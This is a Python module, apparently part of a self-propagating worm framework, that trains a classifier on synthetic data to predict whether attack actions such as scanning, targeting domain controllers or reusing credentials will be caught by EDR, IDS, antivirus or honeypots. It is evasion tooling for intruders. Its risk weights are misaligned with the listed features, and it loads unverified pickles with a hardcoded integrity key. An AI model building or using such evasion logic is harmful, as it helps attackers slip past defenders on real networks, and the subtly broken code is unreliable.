"""Evasion Detection Model — predicts probability of detection for a given action profile."""

import hashlib
import hmac
import json
import os
import sys
from typing import Dict, List, Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import numpy as np

from utils.logger import logger

try:
    import pickle

    from sklearn.ensemble import GradientBoostingClassifier

    SKLEARN_AVAILABLE = True
except ImportError:
    SKLEARN_AVAILABLE = False

try:
    import tensorflow as tf

    TF_AVAILABLE = True
except ImportError:
    TF_AVAILABLE = False


FEATURE_NAMES = [
    "scan_rate",
    "stealth_delay",
    "ports_scanned",
    "targets_parallel",
    "is_windows_target",
    "is_linux_target",
    "is_dc_target",
    "has_edr",
    "has_ids",
    "has_av",
    "is_honeypot",
    "hour_of_day",
    "is_work_hours",
    "day_of_week",
    "success_rate_last_10",
    "polymorphic_level",
    "protocol_count",
    "credential_age_hours",
]

RISK_LABELS = ["safe", "suspicious", "detected"]


class EvasionModel:
    """ML model that predicts detection probability before taking an action.

    Uses GradientBoosting if sklearn is available, falls back to a heuristic scorer.
    """

    def __init__(self, model_path: str = None):
        self.model = None
        self.model_path = model_path
        self.is_trained = False
        self._load_or_train()

    def _load_or_train(self):
        if self.model_path and os.path.exists(self.model_path):
            try:
                if self.model_path.endswith(".pkl") and SKLEARN_AVAILABLE:
                    sig_path = self.model_path + ".sig"
                    if os.path.exists(sig_path):
                        with open(self.model_path, "rb") as f:
                            raw_data = f.read()
                        with open(sig_path, "rb") as sf:
                            expected_sig = sf.read().strip()
                        computed_sig = hmac.new(
                            b"wormy_model_integrity_key", raw_data, hashlib.sha256
                        ).hexdigest().encode()
                        if not hmac.compare_digest(computed_sig, expected_sig):
                            raise ValueError("Model integrity check failed — possible tampering")
                        self.model = pickle.loads(raw_data)
                    else:
                        logger.warning(f"No signature file for {self.model_path}, loading without verification")
                        with open(self.model_path, "rb") as f:
                            self.model = pickle.load(f)
                    if not hasattr(self.model, "predict"):
                        raise ValueError("Loaded object is not a valid model (no predict method)")
                    self.is_trained = True
                    return
                elif self.model_path.endswith(".h5") and TF_AVAILABLE:
                    self.model = tf.keras.models.load_model(self.model_path)
                    self.is_trained = True
                    return
            except Exception as e:
                logger.warning(f"Failed to load model from {self.model_path}: {e}")
                self.model = None
        self.model = self._train_synthetic()

    def _train_synthetic(self):
        if not SKLEARN_AVAILABLE:
            return None
        np.random.seed(42)
        n = 2000
        X = np.random.rand(n, len(FEATURE_NAMES))

        # FIX: Make binary features actually binary (0 or 1)
        binary_indices = [4, 5, 6, 7, 8, 9, 10, 11]  # is_windows, is_linux, is_dc, has_edr, has_ids, has_av, is_honeypot, is_work_hours
        for idx in binary_indices:
            if idx < X.shape[1]:
                X[:, idx] = np.random.randint(0, 2, size=n).astype(float)

        y = np.zeros(n, dtype=int)
        for i in range(n):
            # FIX: Use realistic feature weights for risk calculation
            risk = (
                X[i, 0] * 0.1 +  # scan_rate
                (1.0 - X[i, 1]) * 0.15 +  # stealth_delay (low = risky)
                X[i, 2] * 0.05 +  # ports_scanned
                X[i, 3] * 0.1 +  # targets_parallel
                X[i, 4] * 0.1 +  # is_windows_target
                X[i, 5] * 0.05 +  # is_linux_target
                X[i, 6] * 0.15 +  # is_dc_target
                X[i, 7] * 0.2 +  # has_edr
                X[i, 8] * 0.15 +  # has_ids
                X[i, 9] * 0.2 +  # is_honeypot
                X[i, 10] * 0.05 +  # hour_of_day
                X[i, 11] * 0.1 +  # is_work_hours
                X[i, 12] * 0.05 +  # day_of_week
                (1.0 - X[i, 13]) * 0.1 +  # success_rate_last_10 (low = risky)
                (1.0 - X[i, 14]) * 0.1 +  # polymorphic_level (low = risky)
                X[i, 15] * 0.05 +  # protocol_count
                (1.0 - X[i, 16]) * 0.1  # credential_age_hours (low = risky)
            )
            noise = np.random.rand() * 0.15
            if risk + noise > 0.75:
                y[i] = 2  # detected
            elif risk + noise > 0.45:
                y[i] = 1  # suspicious

        model = GradientBoostingClassifier(n_estimators=100, max_depth=5, random_state=42)
        model.fit(X, y)
        self.is_trained = True
        if self.model_path:
            try:
                os.makedirs(os.path.dirname(os.path.abspath(self.model_path)), exist_ok=True)
            except Exception:
                pass
            with open(self.model_path, "wb") as f:
                pickle.dump(model, f)
            sig_path = self.model_path + ".sig"
            with open(self.model_path, "rb") as f:
                raw_data = f.read()
            sig = hmac.new(
                b"wormy_model_integrity_key", raw_data, hashlib.sha256
            ).hexdigest()
            with open(sig_path, "wb") as sf:
                sf.write(sig.encode())
        return model

    def predict_detection_probability(self, features: Dict[str, float]) -> float:
        """Return probability of detection (0.0 — safe, 1.0 — certain detection)."""
        if self.model is None:
            return self._heuristic_score(features)
        vec = np.array([[features.get(k, 0.0) for k in FEATURE_NAMES]])
        if hasattr(self.model, "predict_proba"):
            probs = self.model.predict_proba(vec)[0]
            return float(probs[-1]) if len(probs) > 1 else 0.5
        return float(self.model.predict(vec)[0]) / 2.0

    def _heuristic_score(self, features: Dict[str, float]) -> float:
        # FIX: Use more features for heuristic scoring
        scan_rate = features.get("scan_rate", 0)
        stealth_delay = features.get("stealth_delay", 1)
        has_edr = features.get("has_edr", 0)
        has_ids = features.get("has_ids", 0)
        has_av = features.get("has_av", 0)
        is_honeypot = features.get("is_honeypot", 0)
        is_work_hours = features.get("is_work_hours", 0)
        success_rate = features.get("success_rate_last_10", 0.5)
        polymorphic_level = features.get("polymorphic_level", 0)
        is_dc = features.get("is_dc_target", 0)

        score = 0.0
        if scan_rate > 100:
            score += 0.2
        if stealth_delay < 0.5:
            score += 0.15
        if has_edr:
            score += 0.15
        if has_ids:
            score += 0.1
        if has_av:
            score += 0.05
        if is_honeypot:
            score += 0.3
        if is_work_hours:
            score -= 0.05  # Slightly safer during work hours
        if success_rate < 0.3:
            score += 0.1  # Low success rate = suspicious
        if polymorphic_level < 1:
            score += 0.1  # No polymorphism = easier to detect
        if is_dc:
            score += 0.1  # DCs are more monitored
        return min(max(score, 0.0), 1.0)

    def get_status(self) -> Dict:
        return {
            "trained": self.is_trained,
            "model_path": self.model_path,
            "backend": "sklearn" if self.model and SKLEARN_AVAILABLE else "heuristic",
        }
